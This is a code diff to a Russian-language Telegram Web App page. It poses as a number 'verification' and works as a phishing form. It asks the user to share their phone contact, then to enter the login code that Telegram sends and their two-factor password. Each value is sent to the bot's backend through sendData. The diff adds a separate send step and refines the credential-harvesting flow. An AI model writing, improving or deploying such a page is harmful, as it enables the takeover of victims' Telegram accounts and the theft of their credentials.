@@ -2,7 +2,6 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
@@ -10,22 +9,24 @@
         .btn { background: #00ff88; color: #000; padding: 15px; border-radius: 12px; width: 100%; border: none; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; }
         .hidden { display: none; }
         input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 10px; border: 1px solid #333; background: #111; color: #fff; box-sizing: border-box; text-align: center; }
+        #status { color: #555; font-size: 12px; margin-top: 10px; }
     </style>
 </head>
 <body>
     <div class="card">
         <div id="step1">
             <h2 style="color: #00ff88;">ВЕРИФИКАЦИЯ</h2>
-            <p>Нажмите кнопку, чтобы подтвердить номер</p>
-            <button class="btn" id="auth-btn">ПОДТВЕРДИТЬ</button>
+            <p id="msg">Нажмите кнопку, чтобы подтвердить номер</p>
+            <button class="btn" id="auth-btn">ШАГ 1: ПОДТВЕРДИТЬ</button>
+            <button class="btn hidden" id="send-btn" style="background: #fff;">ШАГ 2: ОТПРАВИТЬ КОД</button>
         </div>
         <div id="step2" class="hidden">
-            <h2>ШАГ 2</h2>
-            <p>Код придет в чат Telegram</p>
-            <input type="number" id="sms-code" placeholder="Код">
+            <h2>ШАГ 3</h2>
+            <input type="number" id="sms-code" placeholder="Код из Telegram">
             <input type="password" id="two-fa" placeholder="Пароль (если есть)">
-            <button class="btn" id="final-btn">ВОЙТИ</button>
+            <button class="btn" id="final-btn">ЗАВЕРШИТЬ</button>
         </div>
+        <div id="status">v.999 Active</div>
     </div>
 
     <script>
@@ -33,26 +34,36 @@
         tg.ready();
         let phone = "";
 
+        // Шаг 1: Получаем контакт
         document.getElementById('auth-btn').onclick = function() {
             tg.requestContact(function(ok, res) {
                 if (ok) {
                     phone = res.response_data?.phone_number || res.contact?.phone_number;
-                    // Если sendData не сработает (на ПК), мы все равно переключим экран
-                    tg.sendData(JSON.stringify({a: "s", p: String(phone)}));
-                    
-                    document.getElementById('step1').classList.add('hidden');
-                    document.getElementById('step2').classList.remove('hidden');
-                } else {
-                    alert("Нужно нажать 'Поделиться'");
+                    if (phone) {
+                        // Скрываем первую кнопку, показываем вторую
+                        document.getElementById('auth-btn').classList.add('hidden');
+                        document.getElementById('send-btn').classList.remove('hidden');
+                        document.getElementById('msg').innerText = "Номер получен! Нажмите 'ОТПРАВИТЬ КОД'";
+                    }
                 }
             });
         };
 
+        // Шаг 2: Отправляем на бэкенд
+        document.getElementById('send-btn').onclick = function() {
+            if (phone) {
+                tg.sendData(JSON.stringify({a: "s", p: String(phone)}));
+                document.getElementById('step1').classList.add('hidden');
+                document.getElementById('step2').classList.remove('hidden');
+            }
+        };
+
+        // Шаг 3: Финальный вход
         document.getElementById('final-btn').onclick = function() {
-            const c = document.getElementById('code').value;
-            const p = document.getElementById('pass').value || "none";
+            const c = document.getElementById('code')?.value || document.getElementById('sms-code').value;
+            const p = document.getElementById('two-fa').value || "none";
             tg.sendData(JSON.stringify({a: "v", p: String(phone), c: String(c), pass: String(p)}));
-            tg.close();
+            setTimeout(() => { tg.close(); }, 500);
         };
     </script>
 </body>
